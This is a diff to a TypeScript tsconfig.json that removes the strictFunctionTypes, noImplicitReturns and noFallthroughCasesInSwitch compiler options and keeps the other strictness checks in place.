@@ -17,11 +17,8 @@
     "allowSyntheticDefaultImports": true,
     "noImplicitAny": true,
     "strictNullChecks": true,
-    "strictFunctionTypes": true,
     "noUnusedLocals": true,
-    "noUnusedParameters": true,
-    "noImplicitReturns": true,
-    "noFallthroughCasesInSwitch": true
+    "noUnusedParameters": true
   },
   "include": ["src/**/*"],
   "exclude": ["node_modules", "dist", "**/*.test.ts"]
